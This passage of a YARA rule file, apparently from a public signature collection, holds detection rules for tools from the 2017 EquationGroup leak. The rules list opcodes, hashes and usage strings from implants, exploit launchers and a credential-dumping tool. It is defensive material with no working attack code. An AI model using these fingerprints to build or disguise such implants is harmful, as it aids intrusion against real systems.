      $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 }
      $op5 = { 8a 40 01 00 c7 47 70 }
      $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 }
      $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 4 of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_BH {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "7ae9a247b60dc31f424e8a7a3b3f1749ba792ff1f4ba67ac65336220021fce9f"
      id = "c6ae85b6-0670-558c-9ce5-64bd5822f35b"
   strings:
      $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 }
      $op1 = { 45 33 c9 49 8d 7f 2c 41 ba }
      $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PC_LP {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "3a505c39acd48a258f4ab7902629e5e2efa8a2120a4148511fe3256c37967296"
      id = "c3f8f0f9-80ab-5d8e-be42-59b90dc291cb"
   strings:
      $s1 = "* Failed to get connection information.  Aborting launcher!" fullword wide
      $s2 = "Format: <command> <target port> [lp port]" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_RemoteCommand_Lp {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "57b47613a3b5dd820dae59fc6dc2b76656bd578f015f367675219eb842098846"
      id = "98ace4d7-edd0-5e84-bac8-b69e5307f567"
   strings:
      $s1 = "Failure parsing command from %hs:%u: os=%u plugin=%u" fullword wide
      $s2 = "Unable to get TCP listen port: %08x" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_lp_mstcp {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "2ab1e1d23021d887759750a0c053522e9149b7445f840936bbc7e703f8700abd"
      id = "afa4985e-7c8f-58fc-9881-219ccba6a495"
   strings:
      $s1 = "\\Registry\\User\\CurrentUser\\" wide
      $s2 = "_PacketNDISRequestComplete@12\"" fullword ascii
      $s3 = "_LDNdis5RegDeleteKeys@4" ascii

      $op1 = { 89 7e 04 75 06 66 21 46 02 eb }
      $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 }
      $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and ( all of ($s*) or all of ($op*) ) )
}

rule EquationGroup_Toolset_Apr17_renamer {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "9c30331cb00ae8f417569e9eb2c645ebbb36511d2d1531bb8d06b83781dfe3ac"
      id = "b5a7c8a8-c30d-5667-a458-6962a24061d3"
   strings:
      $s1 = "FILE_NAME_CONVERSION.LOG" fullword wide
      $s2 = "Log file exists. You must delete it!!!" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PC_Exploit {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0"
      id = "67a4c8b8-87fb-5f2d-a4dd-299d087c77a3"
   strings:
      $s1 = "\\\\.\\pipe\\pcheap_reuse" fullword wide
      $s2 = "**** FAILED TO DUPLICATE SOCKET ****" fullword wide
      $s3 = "**** UNABLE TO DUPLICATE SOCKET TYPE %u ****" fullword wide
      $s4 = "YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this..." fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_PC_Level3_Gen {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c7dd49b98f399072c2619758455e8b11c6ee4694bb46b2b423fa89f39b185a97"
      hash2 = "f6b723ef985dfc23202870f56452581a08ecbce85daf8dc7db4491adaa4f6e8f"
      id = "c479964c-3122-511d-9410-bc5d890f1489"
   strings:
      $s1 = "S-%u-%u" fullword ascii
      $s2 = "Copyright (C) Microsoft" fullword wide

      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }
      $op2 = { 44 24 4e 41 88 5c 24 4f ff }
      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )
}

rule EquationGroup_Toolset_Apr17_put_Implant9x {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "8fcc98d63504bbacdeba0c1e8df82f7c4182febdf9b08c578d1195b72d7e3d5f"
      id = "73cafd51-8b0d-59e3-966d-2f5de65953a7"
   strings:
      $s1 = "3&3.3<3A3F3K3V3c3m3" fullword ascii

      $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 }
      $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_promiscdetect_safe {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "6070d8199061870387bb7796fb8ccccc4d6bafed6718cbc3a02a60c6dc1af847"
      id = "d6103861-b332-5c21-8408-76b512012689"
   strings:
      $s1 = "running on this computer!" fullword ascii
      $s2 = "- Promiscuous (capture all packets on the network)" fullword ascii
      $s3 = "Active filter for the adapter:" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_PacketScan_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "9b97cac66d73a9d268a15e47f84b3968b1f7d3d6b68302775d27b99a56fbb75a"
      id = "e49695d9-15ae-53a6-955c-c68402e241a2"
   strings:
      $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff }
      $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 }
      $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30KB and all of them )
}

rule EquationGroup_Toolset_Apr17_SetPorts {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "722d3cf03908629bc947c4cca7ce3d6b80590a04616f9df8f05c02de2d482fb2"
      id = "6dc67951-714e-57d9-b34a-0006348b6b10"
   strings:
      $s1 = "USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]" fullword ascii
      $s2 = "Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      modified = "2023-01-06"
      hash1 = "8d2e43567e1360714c4271b75c21a940f6b26a789aa0fce30c6478ae4ac587e4"
      id = "79a3cc02-0cda-59e2-8698-29a6cb0a3061"
   strings:
      $s1 = "system32\\winsrv.dll" fullword wide
      $s2 = "raw_open CreateFile error" fullword ascii
      $s3 = "\\dllcache\\" wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_Toolset_Apr17_msgks_mskgu {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "7b4986aee8f5c4dca255431902907b36408f528f6c0f7d7fa21f079fa0a42e09"
      hash2 = "ef906b8a8ad9dca7407e0a467b32d7f7cf32814210964be2bfb5b0e6d2ca1998"
      id = "1692848d-a8db-5c11-9dc4-f1b0c45a78c3"
   strings:
      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Ifconfig_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "1ebfc0ce7139db43ddacf4a9af2cb83a407d3d1221931d359ee40588cfd0d02b"
      id = "db8ec377-a9f6-5d75-a123-aa0365d98065"
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\%hs" fullword wide

      $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 }
      $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "ffff3526ed0d550108e97284523566392af8523bbddb5f212df12ef61eaad3e6"
      id = "c6ae85b6-0670-558c-9ce5-64bd5822f35b"
   strings:
      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Dsz_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "fbe103fac45abe4e3638055a3cac5e7009166f626cf2d3049fb46f3b53c1057f"
      hash2 = "ad1dddd11b664b7c3ad6108178a8dade0a6d9795358c4a7cedbe789c62016670"
      id = "febc8654-7dc3-5c8b-a53c-f8d7dc29b14b"
   strings:
      $s1 = "%02u:%02u:%02u.%03u-%4u: " fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_GenKey {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "b6f100b21da4f7e3927b03b8b5f0c595703b769d5698c835972ca0c81699ff71"
      id = "54e15017-a2f7-5135-af88-b13ea5866c5f"
   strings:
      $x1 = "* PrivateEncrypt -> PublicDecrypt FAILED" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_wmi_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "de08d6c382faaae2b4b41b448b26d82d04a8f25375c712c12013cb0fac3bc704"
      id = "e058d2cc-b963-55bc-9bdd-468f64fe8e6f"
   strings:
      $x1 = "SELECT ProcessId,Description,ExecutablePath FROM Win32_Process" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}

rule EquationGroup_Toolset_Apr17_clocksvc {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c1bcd04b41c6b574a5c9367b777efc8b95fe6cc4e526978b7e8e09214337fac1"
      id = "ec0e90a5-1359-55e5-9165-494f90431247"
   strings:
      $x1 = "~debl00l.tmp" fullword ascii
      $x2 = "\\\\.\\mailslot\\c54321" fullword ascii
      $x3 = "\\\\.\\mailslot\\c12345" fullword ascii
      $x4 = "nowMutex" fullword ascii

      $s1 = "System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate" fullword ascii
      $s2 = "000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98" ascii
      $s3 = "00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or 2 of ($s*) ) )
}

rule EquationGroup_Toolset_Apr17_xxxRIDEAREA {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "214b0de83b04afdd6ad05567825b69663121eda9e804daff9f2da5554ade77c6"
      id = "2475778b-1246-5471-b305-a946c253c50c"
   strings:
      $x1 = "USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]" fullword ascii
      $x2 = "The output payload \"%s\" has a size of %d-bytes." fullword ascii
      $x3 = "ERROR: fwrite(%s) failed on ucPayload" fullword ascii
      $x4 = "Load and execute implant within the existing thread" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_yak_min_install {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "f67214083d60f90ffd16b89a0ce921c98185b2032874174691b720514b1fe99e"
      id = "dc648deb-4220-5ec3-b95f-ff6cc463f79b"
   strings:
      $s1 = "driver start" fullword ascii
      $s2 = "DeviceIoControl Error: %d" fullword ascii
      $s3 = "Phlook" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_SetOurAddr {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "04ccc060d401ddba674371e66e0288ebdbfa7df74b925c5c202109f23fb78504"
      id = "a2dbfa7b-3fb6-56cf-9391-1a3abb08e3cb"
   strings:
      $s1 = "USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]" fullword ascii
      $s2 = "Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c8b354793ad5a16744cf1d4efdc5fe48d5a0cf0657974eb7145e0088fcf609ff"
      hash2 = "5f06ec411f127f23add9f897dc165eaa68cbe8bb99da8f00a4a360f108bb8741"
      id = "b3fda153-563c-5a5c-9f5c-12d6ef8b3d95"
   strings:
      $s1 = "\\system32\\win32k.sys" wide
      $s2 = "hKeAddSystemServiceTable" fullword ascii
      $s3 = "hPsDereferencePrimaryToken" fullword ascii
      $s4 = "CcnFormSyncExFBC" fullword wide
      $s5 = "hPsDereferencePrimaryToken" fullword ascii

      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b }
      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 }
      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and ( 4 of ($s*) or all of ($op*) ) )
}

rule EquationGroup_Toolset_Apr17_SendPKTrigger {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26"
      id = "6cbf95eb-323c-53a3-9aca-222626add4dc"
   strings:
      $x1 = "----====**** PORT KNOCK TRIGGER BEGIN ****====----" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DmGz_Target_2 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "55ac29b9a67e0324044dafaba27a7f01ca3d8e4d8e020259025195abe42aa904"
      id = "426e982c-2380-5801-ba80-ab25ec4c0f74"
   strings:
      $s1 = "\\\\.\\%ls" fullword ascii

      $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 }
      $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 }
      $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      modified = "2023-01-06"
      hash1 = "26215bc56dc31d2466d72f1f4e1b6388e62606e9949bc41c28968fcb9a9d60a6"
      hash2 = "fcfb56fa79d2383d34c471ef439314edc2239d632a880aa2de3cea430f6b5665"
      hash3 = "a5ec4d102d802ada7c5083af53fd9d3c9b5aa83be9de58dbb4fac7876faf6d29"
      id = "5b54e68b-7bf3-59a0-8257-c370a3b9e4db"
   strings:
      $s1 = "\\Registry\\User\\CurrentUser\\" wide
      $s2 = "\\DosDevices\\%ws" wide
      $s3 = "\\Device\\%ws_%ws" wide
      $s4 = "sys\\mstcp32.dbg" fullword ascii
      $s5 = "%ws%03d%ws%wZ" fullword wide
      $s6 = "TCP/IP driver" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 4 of them )
}

rule EquationGroup_Toolset_Apr17_regprobe {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "99a42440d4cf1186aad1fd09072bd1265e7c6ebbc8bcafc28340b4fe371767de"
      id = "184618b7-a24c-5a8c-9fb2-a5a07f1a0299"
   strings:
      $x1 = "Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]" fullword ascii
      $x2 = "key does not exist or pinging w2k system" fullword ascii
      $x3 = "RpcProxy=255.255.255.255:65536" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "f265defd87094c95c7d3ddf009d115207cd9d4007cf98629e814eda8798906af"
      hash2 = "8d62ca9e6d89f2b835d07deb5e684a576607e4fe3740f77c0570d7b16ebc2985"
      hash3 = "634a80e37e4b32706ad1ea4a2ff414473618a8c42a369880db7cc127c0eb705e"
      id = "f77fd49f-815b-5fb9-a3d7-8721edf79b28"
   strings:
      $s1 = ".dllfD" fullword ascii
      $s2 = "Khsppxu" fullword ascii
      $s3 = "D$8.exe" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_GangsterThief_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "50b269bda5fedcf5a62ee0514c4b14d48d53dd18ac3075dcc80b52d0c2783e06"
      id = "9127f280-135e-5f83-9587-eab3ad84ad69"
   strings:
      $s1 = "\\\\.\\%s:" fullword wide
      $s4 = "raw_open CreateFile error" fullword ascii
      $s5 = "-PATHDELETED-" ascii
      $s6 = "(deleted)" fullword wide
      $s8 = "NULLFILENAME" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule EquationGroup_Toolset_Apr17_SetCallbackPorts {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "16f66c2593665c2507a78f96c0c2a9583eab0bda13a639e28f550c92f9134ff0"
      id = "3c06fc74-2e75-5348-bb62-30c724de1414"
   strings:
      $s1 = "USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]" fullword ascii
      $s2 = "You may enter between 1 and 6 ports to change the defaults." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "0654b4b8727488769390cd091029f08245d690dd90d1120e8feec336d1f9e788"
      id = "b02fa407-e6f1-5c2d-a587-7edb55dbe0a5"
   strings:
      $s2 = "0M1U1Z1p1" fullword ascii /* base64 encoded string '3U5gZu' */
      $s14 = "SPRQWV" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}

rule EquationGroup_Toolset_Apr17_rc5 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "69e2c68c6ea7be338497863c0c5ab5c77d5f522f0a84ab20fe9c75c7f81318eb"
      id = "854c1726-4ba4-5464-a765-4dd154a1b166"
   strings:
      $s1 = "Usage: %s [d|e] session_key ciphertext" fullword ascii
      $s2 = "where session_key and ciphertext are strings of hex" fullword ascii
      $s3 = "d = decrypt mode, e = encrypt mode" fullword ascii
      $s4 = "Bad mode, should be 'd' or 'e'" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_PC_Level_Generic {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "7a6488dd13936e505ec738dcc84b9fec57a5e46aab8aff59b8cfad8f599ea86a"
      hash2 = "0e3cfd48732d0b301925ea3ec6186b62724ec755ed40ed79e7cd6d3df511b8a0"
      hash3 = "d1d6e3903b6b92cc52031c963e2031b5956cadc29cc8b3f2c8f38be20f98a4a7"
      hash4 = "25a2549031cb97b8a3b569b1263c903c6c0247f7fff866e7ec63f0add1b4921c"
      hash5 = "591abd3d7ee214df25ac25682b673f02219da108d1384261052b5167a36a7645"
      hash6 = "6b71db2d2721ac210977a4c6c8cf7f75a8f5b80b9dbcece1bede1aec179ed213"
      hash7 = "7be4c05cecb920f1010fc13086635591ad0d5b3a3a1f2f4b4a9be466a1bd2b76"
      hash8 = "f9cbccdbdf9ffd2ebf1ee84d0ddddd24a61dbe0858ab7f0131bef6c7b9a19131"
      hash9 = "3cf7a01bdf8e73769c80b75ca269b506c33464d81f574ded8bb20caec2d4cd13"
      hash10 = "a87a871fe32c49862ed68fda99d92efd762a33ababcd9b6b2b909f2e01f59c16"
      id = "7ff3d0b0-7a70-561e-9c45-d1f9dbccefe9"
   strings:
      $s1 = "wshtcpip.WSHGetSocketInformation" fullword ascii
      $s2 = "\\\\.\\%hs" fullword ascii
